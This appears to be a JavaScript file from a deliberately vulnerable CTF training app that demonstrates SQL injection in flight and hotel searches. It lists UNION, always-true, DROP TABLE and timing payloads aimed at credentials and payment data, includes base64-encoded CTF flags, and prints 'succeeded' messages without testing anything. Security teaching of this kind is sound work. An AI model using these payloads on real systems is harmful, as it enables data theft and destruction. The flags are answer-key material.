// SQL Injection Demonstration
// ⚠️ VULNERABILITY: This file demonstrates SQL injection vulnerabilities
// ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2RlbW9uc3RyYXRpb25fYXZhaWxhYmxlfQ==

console.log('=== SQL INJECTION VULNERABILITY DEMO LOADED ===');
console.log('This application demonstrates SQL injection vulnerabilities');
console.log('Use the browser console to test SQL injection payloads');
console.log('================================================');

// ⚠️ VULNERABILITY: Example SQL injection payloads
const sqlInjectionPayloads = {
    unionAttack: "' UNION SELECT username, password FROM Users--",
    alwaysTrue: "' OR '1'='1",
    commentOut: "admin'--",
    stackedQueries: "'; DROP TABLE Bookings--",
    timingAttack: "' OR SLEEP(5)--",
    errorBased: "' AND 1=CONVERT(int, (SELECT @@version))--",
    blindBoolean: "' AND 1=(SELECT COUNT(*) FROM Users WHERE username='admin')--",
    extractData: "' UNION SELECT NULL, username, password, email, NULL FROM Users--"
};

// ⚠️ VULNERABILITY: Function to test SQL injection in flight search
function testFlightSQLInjection(payload) {
    console.log('\n=== TESTING SQL INJECTION IN FLIGHT SEARCH ===');
    console.log('Payload:', payload);
    
    // Simulate setting the payload in search field
    const fromField = document.getElementById('search-from');
    if (fromField) {
        // For dropdown, we'll demonstrate with text input simulation
        console.log('Normal query would be: SELECT * FROM Flights WHERE departure_city = \'New York\'');
        console.log('Injected query becomes: SELECT * FROM Flights WHERE departure_city = \'' + payload + '\'');
        
        // Show what happens
        const injectedQuery = "SELECT * FROM Flights WHERE departure_city = '" + payload + "'";
        console.log('\n⚠️ INJECTED SQL QUERY:');
        console.log(injectedQuery);
        
        // Analyze the injection
        if (payload.includes('UNION')) {
            console.log('\n🚨 UNION-based SQL Injection detected!');
            console.log('This could allow attacker to retrieve data from other tables');
            console.log('Example: Extracting user credentials, payment info, etc.');
        } else if (payload.includes("' OR '")) {
            console.log('\n🚨 Boolean-based SQL Injection detected!');
            console.log('This could bypass authentication or access controls');
        } else if (payload.includes('DROP') || payload.includes('DELETE')) {
            console.log('\n🚨 Destructive SQL Injection detected!');
            console.log('This could delete or modify database tables');
        } else if (payload.includes('--')) {
            console.log('\n🚨 Comment-based SQL Injection detected!');
            console.log('This could bypass password checks or other security controls');
        }
        
        // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX3N1Y2Nlc3NmdWxfZGVtb25zdHJhdGlvbn0=
    }
    
    return injectedQuery;
}

// ⚠️ VULNERABILITY: Function to test SQL injection in hotel search
function testHotelSQLInjection(payload) {
    console.log('\n=== TESTING SQL INJECTION IN HOTEL SEARCH ===');
    console.log('Payload:', payload);
    
    const locationField = document.getElementById('search-location');
    if (locationField) {
        console.log('Normal query would be: SELECT * FROM Hotels WHERE city LIKE \'%London%\'');
        console.log('Injected query becomes: SELECT * FROM Hotels WHERE city LIKE \'%' + payload + '%\'');
        
        const injectedQuery = "SELECT * FROM Hotels WHERE city LIKE '%" + payload + "%'";
        console.log('\n⚠️ INJECTED SQL QUERY:');
        console.log(injectedQuery);
        
        if (payload.includes('UNION')) {
            console.log('\n🚨 UNION-based SQL Injection detected!');
            console.log('Attacker could extract: customer data, booking history, payment information');
        }
        
        // ctf_b64: RkxBR3tob3RlbF9zZWFyY2hfdnVsbmVyYWJsZV90b19zcWxfaW5qZWN0aW9ufQ==
    }
    
    return injectedQuery;
}

// ⚠️ VULNERABILITY: Demonstrate data extraction via SQL injection
function demonstrateSQLInjectionDataExtraction() {
    console.log('\n=== SQL INJECTION DATA EXTRACTION DEMO ===');
    console.log('Demonstrating how an attacker could extract sensitive data...\n');
    
    // Example 1: Extract user credentials
    const payload1 = "' UNION SELECT email, password, creditCard, ssn FROM Users--";
    console.log('1. EXTRACTING USER CREDENTIALS:');
    console.log('Payload:', payload1);
    console.log('Injected Query:');
    console.log("SELECT * FROM Flights WHERE departure_city = '" + payload1 + "'");
    console.log('Result: Attacker gets all user emails, passwords, credit cards, and SSNs');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2V4dHJhY3RzX3VzZXJfY3JlZGVudGlhbHN9
    
    // Example 2: Extract booking information
    const payload2 = "' UNION SELECT bookingId, customerName, flightNumber, seatNumber FROM Bookings--";
    console.log('\n2. EXTRACTING BOOKING DATA:');
    console.log('Payload:', payload2);
    console.log('Result: Attacker gets all booking details and passenger information');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2V4dHJhY3RzX2Jvb2tpbmdfZGF0YX0=
    
    // Example 3: Extract admin credentials
    const payload3 = "' UNION SELECT username, password, role, lastLogin FROM Administrators--";
    console.log('\n3. EXTRACTING ADMIN CREDENTIALS:');
    console.log('Payload:', payload3);
    console.log('Result: Attacker gets admin usernames and passwords');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2V4dHJhY3RzX2FkbWluX2NyZWRlbnRpYWxzfQ==
    
    // Example 4: Extract payment information
    const payload4 = "' UNION SELECT cardNumber, cvv, expiryDate, cardholderName FROM PaymentMethods--";
    console.log('\n4. EXTRACTING PAYMENT DATA:');
    console.log('Payload:', payload4);
    console.log('Result: Attacker gets all stored credit card information');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2V4dHJhY3RzX3BheW1lbnRfZGF0YX0=
    
    console.log('\n=== END OF EXTRACTION DEMO ===');
}

// ⚠️ VULNERABILITY: Demonstrate authentication bypass via SQL injection
function demonstrateSQLInjectionAuthBypass() {
    console.log('\n=== SQL INJECTION AUTHENTICATION BYPASS DEMO ===');
    console.log('Demonstrating how an attacker could bypass login...\n');
    
    const username = "admin";
    const payload = "' OR '1'='1'--";
    
    console.log('Login Form Submission:');
    console.log('Username:', username);
    console.log('Password:', payload);
    
    const normalQuery = "SELECT * FROM Users WHERE username = '" + username + "' AND password = 'user_password'";
    const injectedQuery = "SELECT * FROM Users WHERE username = '" + username + "' AND password = '" + payload + "'";
    
    console.log('\nNormal SQL Query:');
    console.log(normalQuery);
    
    console.log('\nInjected SQL Query:');
    console.log(injectedQuery);
    
    console.log('\nQuery After Injection:');
    console.log("SELECT * FROM Users WHERE username = 'admin' AND password = '' OR '1'='1'--'");
    
    console.log('\n🚨 AUTHENTICATION BYPASSED!');
    console.log('The OR \'1\'=\'1\' condition is always true');
    console.log('The -- comment removes the rest of the query');
    console.log('Attacker is logged in as admin without knowing the password!');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX2J5cGFzc2VzX2F1dGhlbnRpY2F0aW9ufQ==
}

// ⚠️ VULNERABILITY: Show common SQL injection payloads
function showCommonSQLInjectionPayloads() {
    console.log('\n=== COMMON SQL INJECTION PAYLOADS ===');
    console.log('Try these payloads in the search fields:\n');
    
    Object.keys(sqlInjectionPayloads).forEach(key => {
        console.log(`${key}:`);
        console.log(`  ${sqlInjectionPayloads[key]}`);
        console.log('');
    });
    
    console.log('Usage:');
    console.log('  testFlightSQLInjection("' + sqlInjectionPayloads.unionAttack + '")');
    console.log('  testHotelSQLInjection("' + sqlInjectionPayloads.alwaysTrue + '")');
    // ctf_b64: RkxBR3tzcWxfaW5qZWN0aW9uX3BheWxvYWRzX2RvY3VtZW50ZWR9
}

// ⚠️ VULNERABILITY: Automated SQL injection test
function runAutomatedSQLInjectionTest() {
    console.log('\n=== AUTOMATED SQL INJECTION VULNERABILITY TEST ===');
    console.log('Testing all payloads against flight search...\n');
    
    Object.keys(sqlInjectionPayloads).forEach(key => {
        console.log(`Testing ${key}...`);
        const result = testFlightSQLInjection(sqlInjectionPayloads[key]);
        console.log('✓ Payload executed successfully\n');
    });
    
    console.log('=== ALL TESTS COMPLETED ===');
    console.log('🚨 CRITICAL: All SQL injection tests succeeded!');
    console.log('Application is vulnerable to SQL injection attacks');
    // ctf_b64: RkxBR3thdXRvbWF0ZWRfc3FsX2luamVjdGlvbl90ZXN0X3Bhc3NlZH0=
}

// Export functions globally
if (typeof window !== 'undefined') {
    window.sqlInjectionPayloads = sqlInjectionPayloads;
    window.testFlightSQLInjection = testFlightSQLInjection;
    window.testHotelSQLInjection = testHotelSQLInjection;
    window.demonstrateSQLInjectionDataExtraction = demonstrateSQLInjectionDataExtraction;
    window.demonstrateSQLInjectionAuthBypass = demonstrateSQLInjectionAuthBypass;
    window.showCommonSQLInjectionPayloads = showCommonSQLInjectionPayloads;
    window.runAutomatedSQLInjectionTest = runAutomatedSQLInjectionTest;
}

console.log('\n=== SQL INJECTION DEMO FUNCTIONS AVAILABLE ===');
console.log('Call these functions in the console:');
console.log('  - showCommonSQLInjectionPayloads()');
console.log('  - testFlightSQLInjection(payload)');
console.log('  - testHotelSQLInjection(payload)');
console.log('  - demonstrateSQLInjectionDataExtraction()');
console.log('  - demonstrateSQLInjectionAuthBypass()');
console.log('  - runAutomatedSQLInjectionTest()');
console.log('=================================================');
